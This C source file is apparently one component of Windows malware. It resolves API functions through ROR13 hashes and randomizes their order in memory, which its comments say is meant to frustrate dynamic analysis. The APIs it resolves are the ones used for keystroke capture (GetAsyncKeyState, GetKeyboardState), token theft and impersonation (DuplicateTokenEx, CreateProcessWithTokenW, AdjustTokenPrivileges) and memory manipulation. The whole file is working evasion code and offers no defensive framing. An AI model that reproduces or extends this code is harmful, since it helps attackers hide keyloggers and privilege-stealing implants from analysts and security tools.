#include <Windows.h>
#include <TlHelp32.h>

#ifdef NOAPI
#include "ror13_hashes.h"
#include "mglib.h"

// These force DLLs to get loaded, we need the dll loaded to get its load address
volatile PVOID dmp1 = &IsValidAcl;   // advapi32
volatile PVOID dmp2 = &MessageBoxA;  // USER32

UINT64 ApiResolverAPIs[] = {
    HASH_ROR13_RegisterClassExA,
    HASH_ROR13_CreateWindowExA,
    HASH_ROR13_DispatchMessageA,
    HASH_ROR13_TranslateMessage,
    HASH_ROR13_GetMessageA,
    HASH_ROR13_AdjustTokenPrivileges,
    HASH_ROR13_GetModuleFileNameA,
    HASH_ROR13_Process32Next,
    HASH_ROR13_Process32First,
    HASH_ROR13_SetThreadDesktop,
    HASH_ROR13_CreateProcessWithTokenW,
    HASH_ROR13_DuplicateTokenEx,
    HASH_ROR13_OpenProcess,
    HASH_ROR13_CreateToolhelp32Snapshot,
    HASH_ROR13_GetKeyNameTextW,
    HASH_ROR13_memcpy,
    HASH_ROR13_CloseHandle,
    HASH_ROR13_CreateFileMappingA,
    HASH_ROR13_FreeLibrary,
    HASH_ROR13_CreateFileMappingW,
    HASH_ROR13_MapViewOfFile,
    HASH_ROR13_GetKeyboardState,
    HASH_ROR13_GetKeyState,
    HASH_ROR13_RegisterClassExW,
    HASH_ROR13_GetAsyncKeyState,
    HASH_ROR13_OpenDesktopA,
    HASH_ROR13_GetCurrentProcess,
    HASH_ROR13_OpenProcessToken,
    HASH_ROR13_GetUserNameA,
    HASH_ROR13_VirtualProtect,
    HASH_ROR13_VirtualAlloc,
    HASH_ROR13_LoadLibraryA,
    HASH_ROR13_GetProcAddress,
    HASH_ROR13_LookupPrivilegeValueA
};
#else
PVOID ApiResolverAPIs[] = {
    &RegisterClassExA,
    &CreateWindowExA,
    &DispatchMessageA,
    &TranslateMessage,
    &GetMessageA,
    &AdjustTokenPrivileges,
    &GetModuleFileNameA,
    &Process32Next,
    &Process32First,
    &SetThreadDesktop,
    &CreateProcessWithTokenW,
    &DuplicateTokenEx,
    &OpenProcess,
    &CreateToolhelp32Snapshot,
    &GetKeyNameTextW,
    &memcpy,
    &CloseHandle,
    &CreateFileMappingA,
    &FreeLibrary,
    &CreateFileMappingW,
    &MapViewOfFile,
    &GetKeyboardState,
    &GetKeyState,
    &RegisterClassExW,
    &GetAsyncKeyState,
    &OpenDesktopA,
    &GetCurrentProcess,
    &OpenProcessToken,
    &GetUserNameA,
    &VirtualProtect,
    &VirtualAlloc,
    &LoadLibraryA,
    &GetProcAddress,
    &LookupPrivilegeValueA
};
#endif
// This include MUST be below the ApiResolverAPIs array
// If its not, the #defines will mess up
#include "apiresolver.h"

unsigned int ApiResolverCounter = 0;    // This is used to not get array accesses optimized away into a single value.
unsigned int ApiResolverSeed = 0;       // We are using rand() deterministically, so save the seed(). Not for crypto, its fine to use time()

// Initializes the apiresolverstruct. This becomes a map of value ->      offset       -> function address.
//                                                           API  -> apiresolverstruct ->  ApiResolverAPIs
void InitApiResolver(void)
{
    ApiResolverSeed = time(NULL);
    srand(ApiResolverSeed);

    #ifdef NOAPI
    PVOID dlls[] = {NoAPIGetBaseAddress(HASH_ROR13_ntdll_dll),
                    NoAPIGetBaseAddress(HASH_ROR13_USER32_dll),
                    NoAPIGetBaseAddress(HASH_ROR13_ADVAPI32_dll),
                    NoAPIGetBaseAddress(HASH_ROR13_KERNEL32_DLL),
                    NULL};

    for (int i = 0; i < ApiEnumCount; i++) {
        for (int j = 0; dlls[j] != NULL; j++) {
            UINT64 tmp = (UINT64)NoAPIGetProcAddress(dlls[j], ApiResolverAPIs[i]);
            if (tmp != 0) {
                ApiResolverAPIs[i] = tmp;
                dprintf("ApiResolversAPIs[%d]: %p \n", i, ApiResolverAPIs[i]);
                break;
            }
        }
    }
    #endif

    // This delta is very important. It randomizes the array order in memory to frustrate dynamic analysis.
    // For example, LoadLibraryA can be found at apiresolverstruct[0] depending on this delta.
    unsigned int delta  = rand()%(sizeof(apiresolverstruct)/sizeof(UINT));
    size_t real_size    = sizeof(apiresolverstruct)/sizeof(UINT);
    unsigned int offset = rand()%512;
    
    for (size_t i = 0; i < real_size; i++)
    {
        // printf("[%zu + %u] addr: %p = %u (offset)\n", i, delta, &((UINT*)&apiresolverstruct)[(i+delta)%real_size], offset);
        ((UINT*)&apiresolverstruct)[(i+delta)%real_size] = offset;
        offset += 1 + rand()%512;
    }
}

// This turns the value API back into an offset into apiresolverstruct, which gets the actual function address
PVOID ApiResolver(unsigned int API)
{
    srand(ApiResolverSeed);
    unsigned int delta = rand()%(sizeof(apiresolverstruct)/sizeof(UINT));
    size_t real_size = sizeof(apiresolverstruct)/sizeof(UINT);
    for (size_t i = 0; i < real_size; i++)
    {
        // printf("API: %lu, Other: %lu\n", API, ((UINT*)&apiresolverstruct)[(i+delta)%real_size]);
        if (API == ((UINT*)&apiresolverstruct)[(i+delta)%real_size])
        {
            UINT offset = (UINT)floor(((i+delta)%real_size)/APILENGTH)*sizeof(char*);
            PVOID* ret = (PVOID)((char*)ApiResolverAPIs + offset);
            return *ret;
        }
    }
    return NULL;
}